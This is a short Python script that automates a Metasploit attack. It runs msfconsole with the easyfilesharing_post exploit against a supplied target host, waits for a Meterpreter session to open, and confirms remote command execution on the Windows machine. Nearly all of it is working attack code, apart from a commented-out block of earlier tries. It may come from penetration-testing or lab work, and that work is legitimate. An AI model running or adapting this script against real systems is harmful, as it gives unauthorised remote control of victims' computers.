from datetime import datetime
import subprocess
import re
import sys
import pandas as pd
from tabulate import tabulate
import os
import pexpect

def executeEasyFileSharing(target):
    print("Executing: "+"msfconsole -q -x 'use exploit/windows/http/easyfilesharing_post ;set rhosts "+target[1]+";run")
    print("About to metasploit")
    """
    #result = subprocess.Popen(['msfconsole','-q','-x',str('use exploit/windows/http/easyfilesharing_post ;set rhosts '+target[1] +';run')],universal_newlines = True)
    #result = subprocess.Popen(['msfconsole'], stdin = subprocess.PIPE, stdout = fw, stderr = fw, bufsize = 1)
    print("here")
    #print("msfconsole -q -x "+ str('use exploit/windows/http/easyfilesharing_post ;set rhosts '+target[1] +';run'))
    os.system("msfconsole -q -x "+ str('"use exploit/windows/http/easyfilesharing_post ;set rhosts '+target[1] +';run"'))
    #msfc = subprocess.Popen(['msfconsole'], universal_newlines = True)
    #print(msfc)
    #out , errs = msfc.communicate("use exploit/windows/http/easyfilesharing_post")
    print(out)
    """
    #Create logfile
    fout = open('mylog.txt', 'wb')
    child = pexpect.spawn("msfconsole -q -x "+ str('"use exploit/windows/http/easyfilesharing_post ;set rhosts '+target[1] +';run"'))
    child.logfile = fout
    #print(f"msfconsole -q -x use exploit/windows/http/easyfilesharing_post ;set rhosts +${target[1]} +;run'")
    child.expect("Meterpreter session 1 opened", timeout=300)
    child.sendline("pwd")
    child.expect("C:\WINDOWS\System32",timeout=300)
    print("Success")

